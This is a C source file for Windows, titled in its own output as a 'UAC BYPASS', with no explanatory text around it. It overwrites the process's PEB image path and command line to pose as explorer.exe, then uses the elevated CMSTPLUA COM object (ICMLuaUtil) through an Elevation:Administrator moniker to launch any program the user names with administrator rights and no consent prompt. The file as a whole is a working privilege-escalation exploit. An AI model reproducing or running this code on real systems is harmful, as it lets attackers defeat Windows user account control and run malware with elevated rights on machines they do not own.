#define _CRT_SECURE_NO_WARNINGS

#include <stdio.h>
#include <Windows.h>
#include <winternl.h>

typedef interface ICMLuaUtil ICMLuaUtil;

typedef struct ICMLuaUtilVtbl {

    BEGIN_INTERFACE

        HRESULT(STDMETHODCALLTYPE* QueryInterface)(
            __RPC__in ICMLuaUtil* This,
            __RPC__in REFIID riid,
            _COM_Outptr_  void** ppvObject);

    ULONG(STDMETHODCALLTYPE* AddRef)(
        __RPC__in ICMLuaUtil* This);

    ULONG(STDMETHODCALLTYPE* Release)(
        __RPC__in ICMLuaUtil* This);

    HRESULT(STDMETHODCALLTYPE* Method1)(
        __RPC__in ICMLuaUtil* This);

    HRESULT(STDMETHODCALLTYPE* Method2)(
        __RPC__in ICMLuaUtil* This);

    HRESULT(STDMETHODCALLTYPE* Method3)(
        __RPC__in ICMLuaUtil* This);

    HRESULT(STDMETHODCALLTYPE* Method4)(
        __RPC__in ICMLuaUtil* This);

    HRESULT(STDMETHODCALLTYPE* Method5)(
        __RPC__in ICMLuaUtil* This);

    HRESULT(STDMETHODCALLTYPE* Method6)(
        __RPC__in ICMLuaUtil* This);

    HRESULT(STDMETHODCALLTYPE* ShellExec)(
        __RPC__in ICMLuaUtil* This,
        _In_     LPCTSTR lpFile,
        _In_opt_ LPCTSTR lpParameters,
        _In_opt_ LPCTSTR lpDirectory,
        _In_     ULONG fMask,
        _In_     ULONG nShow
        );

    HRESULT(STDMETHODCALLTYPE* Method8)(
        __RPC__in ICMLuaUtil* This);

    HRESULT(STDMETHODCALLTYPE* Method9)(
        __RPC__in ICMLuaUtil* This);

    HRESULT(STDMETHODCALLTYPE* Method10)(
        __RPC__in ICMLuaUtil* This);

    HRESULT(STDMETHODCALLTYPE* Method11)(
        __RPC__in ICMLuaUtil* This);

    HRESULT(STDMETHODCALLTYPE* Method12)(
        __RPC__in ICMLuaUtil* This);

    HRESULT(STDMETHODCALLTYPE* Method13)(
        __RPC__in ICMLuaUtil* This);

    HRESULT(STDMETHODCALLTYPE* Method14)(
        __RPC__in ICMLuaUtil* This);

    HRESULT(STDMETHODCALLTYPE* Method15)(
        __RPC__in ICMLuaUtil* This);

    HRESULT(STDMETHODCALLTYPE* Method16)(
        __RPC__in ICMLuaUtil* This);

    HRESULT(STDMETHODCALLTYPE* Method17)(
        __RPC__in ICMLuaUtil* This);

    HRESULT(STDMETHODCALLTYPE* Method18)(
        __RPC__in ICMLuaUtil* This);

    HRESULT(STDMETHODCALLTYPE* Method19)(
        __RPC__in ICMLuaUtil* This);

    HRESULT(STDMETHODCALLTYPE* Method20)(
        __RPC__in ICMLuaUtil* This);

    END_INTERFACE

} *PICMLuaUtilVtbl;

interface ICMLuaUtil
{
    CONST_VTBL struct ICMLuaUtilVtbl* lpVtbl;
};

int main() {
    WCHAR LaucheProc[200] = { 0 };
    printf("UAC BYPASS\n");
    printf(">");
    scanf("%ls", LaucheProc);

    wprintf(L"Lauch : %s\n", LaucheProc);

    HANDLE hProc = GetCurrentProcess();

    PPEB pPEB;
    PROCESS_BASIC_INFORMATION pbi;

    WCHAR fakePath[] = L"C:\\Windows\\explorer.exe";
    WCHAR selfPath[MAX_PATH];

    HRESULT hr;
    DWORD err;

    err = GetModuleFileNameW(NULL, selfPath, MAX_PATH);
    if (err == 0) {
        printf("Error : GetModuleFileNameW : %d\n", GetLastError());
        return 1;
    }

    hr = NtQueryInformationProcess(hProc, ProcessBasicInformation, &pbi, sizeof(pbi), NULL);
    if (!NT_SUCCESS(hr)) {
        printf("Error : NtQueryInformationProcess\n");
    }

    if (!pbi.PebBaseAddress) {
        printf("PEB NULL\n");
        return 1;
    }

    pPEB = (PPEB)pbi.PebBaseAddress;

    if (!pPEB) {
        printf("pPEB NULL\n");
        return 1;
    }

    if (!pPEB->ProcessParameters) {
        printf("ProcessParameters NULL\n");
        return 1;
    }

    UNICODE_STRING img = pPEB->ProcessParameters->ImagePathName;
    UNICODE_STRING cmd = pPEB->ProcessParameters->CommandLine;

    if (!img.Buffer || !cmd.Buffer) {
        printf("Buffer NULL\n");
        return 1;
    }

    printf("ImagePath MaximumLength = %hu\n", img.MaximumLength);
    printf("CommandLine MaximumLength = %hu\n", cmd.MaximumLength);

    size_t fakeLenBytes = (wcslen(fakePath) + 1) * sizeof(WCHAR);

    if (fakeLenBytes > img.MaximumLength) {
        printf("ImagePath buffer trop petit (%zu > %hu)\n",
            fakeLenBytes, img.MaximumLength);
        return 1;
    }

    if (fakeLenBytes > cmd.MaximumLength) {
        printf("CommandLine buffer trop petit (%zu > %hu)\n",
            fakeLenBytes, cmd.MaximumLength);
        return 1;
    }

    MEMORY_BASIC_INFORMATION mbi;

    if (VirtualQuery(img.Buffer, &mbi, sizeof(mbi))) {
        if (!(mbi.Protect & (PAGE_READWRITE | PAGE_WRITECOPY))) {
            printf("ImagePath buffer non writable\n");
            return 1;
        }
    }

    wcsncpy(pPEB->ProcessParameters->ImagePathName.Buffer, fakePath, fakeLenBytes);
    wcsncpy(pPEB->ProcessParameters->CommandLine.Buffer, fakePath, fakeLenBytes);


    CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);

    BIND_OPTS3 opts;
    ZeroMemory(&opts, sizeof(opts));

    opts.cbStruct = sizeof(BIND_OPTS3);
    opts.dwClassContext = CLSCTX_LOCAL_SERVER;

    WCHAR moniker[] = L"Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}";

    ICMLuaUtil* CMLuaUtil = NULL;
    IID iid = { 0x6EDD6D74, 0xC007, 0x4E75, {0xB7,0x6A,0xE5,0x74,0x09,0x95,0xE2,0x4C} };

    hr = CoGetObject(moniker, (BIND_OPTS*)&opts, &iid, (void**)&CMLuaUtil);

    printf("hr = 0x%08X\n", hr);

    if (hr == MK_E_SYNTAX) {
        printf("Error : CoGetObject : MK_E_SYNTAX \n");
        return 1;
    }
    else if (hr == MK_E_NOOBJECT) {
        printf("Error : CoGetObject : MK_E_NOOBJECT\n");
        return 1;
    }
    else if (hr == MK_E_EXCEEDEDDEADLINE) {
        printf("Error : CoGetObject :  CoGetObject\n");
        return 1;
    }
    else if (hr == MK_E_CONNECTMANUALLY) {
        printf("Error : CoGetObject : MK_E_CONNECTMANUALLY\n");
        return 1;
    }
    else if (hr == MK_E_INTERMEDIATEINTERFACENOTSUPPORTED) {
        printf("Error : CoGetObject : MK_E_INTERMEDIATEINTERFACENOTSUPPORTED\n");
        return 1;
    }
    else if (hr == E_FAIL) {
        printf("Error : CoGetObject : E_FAIL\n");
        return 1;
    }
    else if (hr == E_OUTOFMEMORY) {
        printf("Error : CoGetObject : E_OUTOFMEMORY\n");
        return 1;
    }
    else if (hr == E_UNEXPECTED) {
        printf("Error : CoGetObject :  E_UNEXPECTED\n");
        return 1;
    }
    else if (hr != S_OK) {
        printf("Error : CoGetObject\n");
        return 1;
    }
    else {
        printf("CoGetObject : GOOD\n");
    }

    CMLuaUtil->lpVtbl->ShellExec(CMLuaUtil, LaucheProc, L"-elevated", NULL, 0, SW_SHOW);
    CMLuaUtil->lpVtbl->Release(CMLuaUtil);

    CoUninitialize();
    return 0;
}